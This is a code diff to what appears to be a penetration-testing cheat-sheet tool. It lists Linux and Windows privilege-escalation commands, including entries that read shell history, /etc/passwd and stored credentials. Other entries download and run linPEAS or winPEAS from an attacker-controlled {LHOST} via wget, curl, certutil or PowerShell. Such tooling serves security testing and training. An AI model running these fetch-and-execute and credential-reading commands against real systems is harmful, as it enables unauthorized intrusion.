@@ -23,12 +23,19 @@ const linuxPrivesc: WorkstationItem = {
     { id: "processes", label: "Processes as root", command: "ps aux | grep -i root" },
     { id: "netstat", label: "Listening ports", command: "ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null" },
     { id: "history", label: "Shell history", command: "cat ~/.bash_history 2>/dev/null; history" },
-    { id: "envs", label: "Environment", command: "env; cat /etc/passwd" },
+    { id: "envs", label: "Environment", command: "env" },
+    { id: "passwd", label: "All users", command: "cat /etc/passwd" },
     {
       id: "linpeas",
-      label: "Download + run linpeas",
-      command: "cd /tmp && wget http://{LHOST}/linpeas.sh -O linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh",
-      explain: "Serve linpeas.sh from your box first (see File Transfer).",
+      label: "Download + run linpeas (wget)",
+      command: "cd /tmp && wget http://{LHOST}:{FILEPORT}/{FILE} -O {FILE} && chmod +x {FILE} && ./{FILE}",
+      explain: "Set FILE=linpeas.sh in the Context bar and serve it first (see File Transfer).",
+    },
+    {
+      id: "linpeas-curl",
+      label: "Download + run linpeas (curl)",
+      command: "cd /tmp && curl http://{LHOST}:{FILEPORT}/{FILE} -o {FILE} && chmod +x {FILE} && ./{FILE}",
+      explain: "Alternative when wget is missing on the target.",
     },
   ],
 };
@@ -51,9 +58,15 @@ const windowsPrivesc: WorkstationItem = {
     { id: "creds-cmdkey", label: "Stored credentials", command: "cmdkey /list" },
     {
       id: "winpeas",
-      label: "Download winPEAS",
-      command: "certutil -urlcache -f http://{LHOST}/winPEASx64.exe winPEAS.exe && winPEAS.exe",
-      explain: "Serve winPEAS from your box first.",
+      label: "Download + run winPEAS (certutil)",
+      command: "certutil -urlcache -f http://{LHOST}:{FILEPORT}/{FILE} {FILE} && {FILE}",
+      explain: "Set FILE=winPEASx64.exe in the Context bar and serve it first (see File Transfer).",
+    },
+    {
+      id: "winpeas-ps",
+      label: "Download + run winPEAS (PowerShell)",
+      command: "powershell -c \"Invoke-WebRequest -Uri http://{LHOST}:{FILEPORT}/{FILE} -OutFile {FILE}\" && {FILE}",
+      explain: "Alternative when certutil is blocked.",
     },
   ],
 };
